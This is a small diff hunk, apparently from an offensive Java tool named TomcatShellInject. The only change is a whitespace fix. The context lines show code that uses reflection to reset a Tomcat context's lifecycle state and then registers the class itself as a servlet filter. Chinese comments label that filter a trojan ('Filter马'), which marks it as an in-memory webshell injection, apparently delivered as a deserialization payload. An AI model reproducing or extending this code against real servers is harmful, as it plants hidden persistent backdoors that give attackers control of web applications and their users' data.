@@ -57,7 +57,7 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
                         stateField.setAccessible(true);
                         stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
                         //创建一个自定义的Filter马
-                            Filter threedr3am = new TomcatShellInject();
+                        Filter threedr3am = new TomcatShellInject();
                         //添加filter马
                         javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
                                 .addFilter(filterName, threedr3am);
